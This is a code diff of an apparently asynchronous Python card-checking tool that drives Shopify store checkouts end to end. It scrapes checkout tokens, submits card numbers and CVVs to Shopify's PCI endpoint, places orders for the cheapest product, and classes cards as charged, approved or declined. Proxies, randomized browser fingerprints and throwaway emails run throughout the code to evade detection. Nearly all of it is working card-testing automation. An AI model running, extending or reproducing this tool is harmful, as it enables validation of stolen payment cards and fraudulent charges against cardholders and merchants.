@@ -1,10 +1,5 @@
 from __future__ import annotations
 
-"""
-Async version of auto.py — curl_cffi.AsyncSession instead of Session.
-All HTTP functions are async. Pure-Python helpers imported from auto.py.
-"""
-
 import asyncio
 import json
 import re
@@ -73,31 +68,35 @@ generate_page_id = _auto.generate_page_id
 
 class AsyncTLSClient:
     def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
-        self.timeout     = timeout
-        self.proxy_url   = proxy_url
-        # 🔥 استخدم البروفايلات المدعومة فقط (بدون firefox133)
+        self.timeout = timeout
+        self.proxy_url = proxy_url
         self.impersonate = impersonate or random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
-        self.user_agent  = user_agent  or random.choice(USER_AGENTS)
-        self._session: AsyncSession | None = None
+        self.user_agent = user_agent or random.choice(USER_AGENTS)
+        self._session = None
 
     def _make_session(self) -> AsyncSession:
-        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
-        s.headers.update({
-            'User-Agent':                self.user_agent,
-            'Accept-Language':           'en-US,en;q=0.9',
-            'Accept-Encoding':           'gzip, deflate, br',
-            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Connection':                'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest':            'document',
-            'Sec-Fetch-Mode':            'navigate',
-            'Sec-Fetch-Site':            'none',
-            'Sec-Fetch-User':            '?1',
-            'Cache-Control':             'max-age=0',
-        })
-        if self.proxy_url:
-            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
-        return s
+        try:
+            # محاولة إنشاء الجلسة مع البروكسي
+            s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
+            s.headers.update({
+                'User-Agent': self.user_agent,
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+                'Cache-Control': 'max-age=0',
+            })
+            if self.proxy_url:
+                s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
+            return s
+        except Exception as e:
+            # إذا فشل إنشاء الجلسة، نرمي خطأ واضحاً
+            raise Exception(f"Proxy connection failed: {e}")
 
     async def __aenter__(self):
         self._session = self._make_session()
@@ -126,8 +125,7 @@ class AsyncTLSClient:
 
 # ── Step 0: cheapest product ──────────────────────────────────────────
 
-async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
-                                min_price: float = 0.50):
+async def find_cheapest_product(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
     best_price = float('inf')
     product_title = product_id = variant_id = price_str = product_handle = ""
     page = 1
@@ -149,12 +147,12 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                 if price < min_price:
                     continue
                 if price < best_price:
-                    best_price      = price
-                    product_title   = p.get("title", "")
-                    product_id      = str(p.get("id", ""))
-                    product_handle  = p.get("handle", "")
-                    variant_id      = str(v.get("id", ""))
-                    price_str       = v.get("price", "")
+                    best_price = price
+                    product_title = p.get("title", "")
+                    product_id = str(p.get("id", ""))
+                    product_handle = p.get("handle", "")
+                    variant_id = str(v.get("id", ""))
+                    price_str = v.get("price", "")
         page += 1
     if not product_title:
         raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")
@@ -179,35 +177,30 @@ _PAGE_HEADERS = {
 }
 
 
-async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
-                                   variant_id: str, product_id: str, product_handle: str):
+async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str, variant_id: str, product_id: str, product_handle: str):
     cart_permalink = f"{shop_url}/cart/{variant_id}:1"
-    checkout_resp  = await client.get(cart_permalink, allow_redirects=True, headers={
+    checkout_resp = await client.get(cart_permalink, allow_redirects=True, headers={
         **_PAGE_HEADERS,
         "user-agent": client.user_agent,
-        "referer":    shop_url + "/",
+        "referer": shop_url + "/",
         "sec-fetch-site": "same-origin",
     })
-    print(f"[CART-PERMALINK] status={checkout_resp.status_code} final_url={checkout_resp.url}")
-
-    checkout_url  = checkout_resp.url
+    checkout_url = checkout_resp.url
     checkout_html = checkout_resp.text
 
     if checkout_resp.status_code not in (200, 302):
         raise Exception(f"cart permalink returned {checkout_resp.status_code}")
 
-    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
     checkout_token = token_match.group(1) if token_match else ""
-    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
-                               checkout_html)
-    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""
+    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
+    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""
     return checkout_url, checkout_token, session_token, checkout_html
 
 
 # ── Step 2: private access token ─────────────────────────────────────
 
-async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str,
-                                     checkout_url: str, pat_id: str) -> str:
+async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
     req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
     headers = {
         "accept": "*/*",
@@ -249,53 +242,47 @@ async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: s
 
 # ── Step 9: PCI session ───────────────────────────────────────────────
 
-async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
-                           card_month: int, card_year: int, cvv: str,
-                           shop_domain: str, proxy_url: str = ""):
+async def send_pci_session(ident_sig: str, card_number: str, card_name: str, card_month: int, card_year: int, cvv: str, shop_domain: str, proxy_url: str = ""):
     payload = json.dumps({
         "credit_card": {
-            "number":             card_number,
-            "month":              card_month,
-            "year":               card_year,
+            "number": card_number,
+            "month": card_month,
+            "year": card_year,
             "verification_value": cvv,
-            "start_month":        None,
-            "start_year":         None,
-            "issue_number":       "",
-            "name":               card_name,
+            "start_month": None,
+            "start_year": None,
+            "issue_number": "",
+            "name": card_name,
         },
         "payment_session_scope": shop_domain,
     })
     headers = {
-        "accept":               "application/json",
-        "accept-language":      "en-US,en;q=0.9",
-        "content-type":         "application/json",
-        "origin":               "https://checkout.pci.shopifyinc.com",
-        "priority":             "u=1, i",
-        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
-        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-        "sec-ch-ua-mobile":     "?0",
-        "sec-ch-ua-platform":   '"Windows"',
-        "sec-fetch-dest":       "empty",
-        "sec-fetch-mode":       "cors",
-        "sec-fetch-site":       "same-origin",
+        "accept": "application/json",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": "https://checkout.pci.shopifyinc.com",
+        "priority": "u=1, i",
+        "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
+        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
         "sec-fetch-storage-access": "active",
         "shopify-identification-signature": ident_sig,
-        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
     async with AsyncSession(impersonate="chrome124") as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
-        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
-                                  data=payload, headers=headers, timeout=12)
+        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", data=payload, headers=headers, timeout=12)
     return resp.status_code, resp.text
 
 
 # ── Step 4: Proposal 1 ────────────────────────────────────────────────
 
-async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str,
-                        checkout_token: str, session_token: str, stable_id: str,
-                        variant_id: str, price: str, proposal_id: str,
-                        build_id: str, source_token: str, currency: str, country: str):
+async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, stable_id: str, variant_id: str, price: str, proposal_id: str, build_id: str, source_token: str, currency: str, country: str):
     gql_payload = f'''{{
   "variables": {{
     "sessionInput": {{"sessionToken": "{session_token}"}},
@@ -383,19 +370,14 @@ async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str
     resp = await client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
-                                  session_token, build_id, source_token),
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
     )
     return resp.status_code, resp.text
 
 
 # ── Step 5: Proposal 2 (email) ────────────────────────────────────────
 
-async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str,
-                         checkout_token: str, session_token: str, stable_id: str,
-                         variant_id: str, price: str, proposal_id: str,
-                         build_id: str, source_token: str, queue_token: str,
-                         email: str, currency: str, country: str):
+async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, stable_id: str, variant_id: str, price: str, proposal_id: str, build_id: str, source_token: str, queue_token: str, email: str, currency: str, country: str):
     gql_payload = f'''{{
   "variables": {{
     "sessionInput": {{"sessionToken": "{session_token}"}},
@@ -485,19 +467,14 @@ async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: st
     resp = await client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
-                                  session_token, build_id, source_token),
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
     )
     return resp.status_code, resp.text
 
 
 # ── Step 6/7/8: Proposal 3 (address) ─────────────────────────────────
 
-async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str,
-                         checkout_token: str, session_token: str, stable_id: str,
-                         variant_id: str, price: str, proposal_id: str,
-                         build_id: str, source_token: str, queue_token: str,
-                         email: str, addr: Address, currency: str, country: str):
+async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, stable_id: str, variant_id: str, price: str, proposal_id: str, build_id: str, source_token: str, queue_token: str, email: str, addr: Address, currency: str, country: str):
     gql_payload = f'''{{
   "variables": {{
     "sessionInput": {{"sessionToken": "{session_token}"}},
@@ -605,48 +582,32 @@ async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: st
     resp = await client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
-                                  session_token, build_id, source_token),
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
     )
     return resp.status_code, resp.text
 
 
 # ── Step 10a: poll for receipt ────────────────────────────────────────
 
-async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str,
-                                checkout_token: str, session_token: str, build_id: str,
-                                source_token: str, poll_id: str, receipt_id: str,
-                                receipt_session_token: str):
-    params   = {
+async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, build_id: str, source_token: str, poll_id: str, receipt_id: str, receipt_session_token: str):
+    params = {
         "operationName": "PollForReceipt",
-        "variables":     json.dumps({"receiptId": receipt_id,
-                                     "sessionToken": receipt_session_token}),
-        "id":            poll_id,
+        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
+        "id": poll_id,
     }
     full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
-    headers  = _proposal_headers(shop_url, checkout_url, checkout_token,
-                                 session_token, build_id, source_token)
+    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
     headers["x-checkout-web-source-id"] = checkout_token
     resp = await client.get(full_url, headers=headers)
-    print(resp.text)
     return resp.status_code, resp.text
 
 
 # ── Step 10b: submit for completion ──────────────────────────────────
 
-async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
-                                     checkout_url: str, checkout_token: str,
-                                     session_token: str, stable_id: str, variant_id: str,
-                                     price: str, submit_id: str, build_id: str,
-                                     source_token: str, queue_token: str, email: str,
-                                     addr: Address, delivery_handle: str, shipping_amount: str,
-                                     total_amount: str, pci_session_id: str, attempt_token: str,
-                                     currency: str, country: str, signed_handles,
-                                     is_digital: bool = False, item_amount: str = None,
-                                     tax_amount: str = None):
-    handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
+async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, stable_id: str, variant_id: str, price: str, submit_id: str, build_id: str, source_token: str, queue_token: str, email: str, addr: Address, delivery_handle: str, shipping_amount: str, total_amount: str, pci_session_id: str, attempt_token: str, currency: str, country: str, signed_handles, is_digital: bool = False, item_amount: str = None, tax_amount: str = None):
+    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
     signed_handles_json = "[" + ",".join(handle_lines) + "]"
-    page_id             = generate_page_id()
+    page_id = generate_page_id()
 
     if is_digital:
         total_amount_block = '"totalAmount": {"any": true}'
@@ -712,7 +673,7 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
       }},
       "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''
 
-    tax_val   = tax_amount or "0.0"
+    tax_val = tax_amount or "0.0"
     tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'
 
     gql_payload = f'''{{
@@ -833,40 +794,40 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
     resp = await client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
-                                  session_token, build_id, source_token),
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
     )
     return resp.status_code, resp.text
 
 
 # ── Main async checkout orchestrator ─────────────────────────────────
 
-async def run_checkout_for_card_async(shop_url: str, card_entry: str,
-                                      proxy_url: str = "") -> CheckResult:
-    currency  = "USD"
-    country   = "US"
+async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
+    currency = "USD"
+    country = "US"
     site_name = shop_url.replace("https://", "").replace("http://", "")
 
-    result = CheckResult(card=card_entry, shop_url=shop_url,
-                         site_name=site_name, currency=currency,
-                         status=CheckStatus.ERROR)
+    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name, currency=currency, status=CheckStatus.ERROR)
     try:
         card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
     except Exception as e:
         result.error = e
         return result
 
-    email       = generate_random_email()
+    email = generate_random_email()
     impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
-    user_agent  = random.choice(USER_AGENTS)
+    user_agent = random.choice(USER_AGENTS)
 
-    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url,
-                            impersonate=impersonate, user_agent=user_agent)
+    try:
+        client = AsyncTLSClient(timeout=12, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
+    except Exception as e:
+        result.status = CheckStatus.ERROR
+        result.error = Exception(f"Proxy initialization failed: {e}")
+        return result
+
     try:
         # Step 0
         try:
             title, product_id, product_handle, variant_id, price = await find_cheapest_product(client, shop_url)
-            print(f"[DBG] site={shop_url} | product='{title}' | handle={product_handle} | variant={variant_id} | price={price}")
             _ = title
         except Exception as e:
             result.status = CheckStatus.ERROR
@@ -876,10 +837,9 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
         # Step 1
         try:
-            checkout_url, checkout_token, session_token, checkout_html = \
-                await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
-            stable_id    = extract_stable_id(checkout_html)
-            build_id     = extract_commit_sha(checkout_html)
+            checkout_url, checkout_token, session_token, checkout_html = await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
+            stable_id = extract_stable_id(checkout_html)
+            build_id = extract_commit_sha(checkout_html)
             source_token = extract_source_token(checkout_html)
             if not stable_id or not build_id or not source_token:
                 raise Exception("missing stableId, buildId, or sourceToken")
@@ -906,9 +866,9 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             actions_url = extract_actions_js_url(checkout_html, shop_url)
             if not actions_url:
                 raise Exception("could not find actions JS URL")
-            js_body     = await fetch_actions_js(client, actions_url, shop_url)
+            js_body = await fetch_actions_js(client, actions_url, shop_url)
             proposal_id = extract_proposal_id(js_body)
-            submit_id   = extract_submit_for_completion_id(js_body)
+            submit_id = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
             poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
@@ -1006,8 +966,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             if not ident_sig:
                 raise Exception("could not extract identification signature")
             pci_status, pci_body = await send_pci_session(
-                ident_sig, card_number,
-                f"{addr.first_name} {addr.last_name}",
+                ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                 card_month, card_year, card_cvv, site_name, proxy_url)
             _ = pci_status
             pci_session_id = extract_pci_session_id(pci_body)
@@ -1024,7 +983,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             if not queue_token5:
                 raise Exception("could not extract queueToken")
 
-            is_digital      = not extract_is_shipping_required(proposal5_body)
+            is_digital = not extract_is_shipping_required(proposal5_body)
             delivery_handle = extract_delivery_handle(proposal5_body)
             if not delivery_handle and not is_digital:
                 result.retryable = True
@@ -1052,7 +1011,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.amount = total_amount
 
             attempt_token = generate_attempt_token(checkout_token)
-            current_tax   = extract_tax_amount(proposal5_body)
+            current_tax = extract_tax_amount(proposal5_body)
             current_total = total_amount
 
             for tax_attempt in range(1, 4):
@@ -1064,7 +1023,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                     signed_handles, is_digital=is_digital, tax_amount=current_tax)
 
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
-                    new_tax   = extract_tax_from_rejected(submit_body)
+                    new_tax = extract_tax_from_rejected(submit_body)
                     new_total = extract_total_from_rejected(submit_body)
                     if new_tax:
                         current_tax = new_tax
@@ -1083,14 +1042,13 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                 if "CAPTCHA" in (error_msg or ""):
                     error_msg = "CARD_DECLINED"
                 if error_msg:
-                    result.status      = CheckStatus.DECLINED
+                    result.status = CheckStatus.DECLINED
                     result.status_code = error_msg
-                    result.error       = Exception(error_msg)
-                    result.retryable   = any(k in error_msg.lower()
-                                             for k in ['inventory', 'retry', 'try again', 'generic'])
+                    result.error = Exception(error_msg)
+                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again', 'generic'])
                 else:
-                    result.status    = CheckStatus.ERROR
-                    result.error     = Exception("Step 10 failed: could not extract receiptId or error message")
+                    result.status = CheckStatus.ERROR
+                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                     result.retryable = True
                 return result
 
@@ -1099,12 +1057,12 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                 raise Exception("Step 10 failed: could not extract sessionToken")
         except Exception as e:
             result.status = CheckStatus.ERROR
-            result.error  = e
+            result.error = e
             return result
 
         # Step 11 — poll for receipt
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
-        type_name_re  = re.compile(
+        type_name_re = re.compile(
             r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
 
         for poll_num in range(1, 31):
@@ -1122,36 +1080,36 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                 result.status_code = extract_receipt_status_code(poll_body, receipt_type)
 
                 if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
-                    result.status      = CheckStatus.CHARGED
+                    result.status = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
                     result.receipt_url = checkout_url + "/thank_you"
                     return result
 
                 if receipt_type == "ActionRequiredReceipt":
-                    result.status      = CheckStatus.APPROVED
+                    result.status = CheckStatus.APPROVED
                     result.status_code = "3DS_AUTHENTICATION"
                     return result
 
                 if receipt_type == "FailedReceipt":
-                    error_re   = re.compile(r'"code"\s*:\s*"([^"]+)"')
-                    em         = error_re.search(poll_body)
+                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
+                    em = error_re.search(poll_body)
                     error_code = em.group(1) if em else ""
                     if "CAPTCHA" in error_code:
                         error_code = "CARD_DECLINED"
                     if error_code == "INSUFFICIENT_FUNDS":
-                        result.status      = CheckStatus.APPROVED
+                        result.status = CheckStatus.APPROVED
                         result.status_code = "INSUFFICIENT_FUNDS"
                     elif error_code in ("CARD_DECLINED", "GENERIC_ERROR"):
-                        result.status      = CheckStatus.DECLINED
+                        result.status = CheckStatus.DECLINED
                         result.status_code = "CARD_DECLINED"
-                        result.error       = Exception("CARD_DECLINED")
+                        result.error = Exception("CARD_DECLINED")
                     else:
                         if "InventoryReservationFailure" in poll_body:
-                            result.status    = CheckStatus.ERROR
+                            result.status = CheckStatus.ERROR
                             result.retryable = True
                         else:
                             result.status = CheckStatus.DECLINED
-                            result.error  = Exception(error_code)
+                            result.error = Exception(error_code)
                     return result
 
                 delay = 500
@@ -1167,11 +1125,11 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
             except Exception as e:
                 result.status = CheckStatus.ERROR
-                result.error  = Exception(f"poll {poll_num} failed: {e}")
+                result.error = Exception(f"poll {poll_num} failed: {e}")
                 return result
 
         result.status = CheckStatus.ERROR
-        result.error  = Exception("exceeded 30 poll attempts")
+        result.error = Exception("exceeded 30 poll attempts")
         return result
 
     finally:
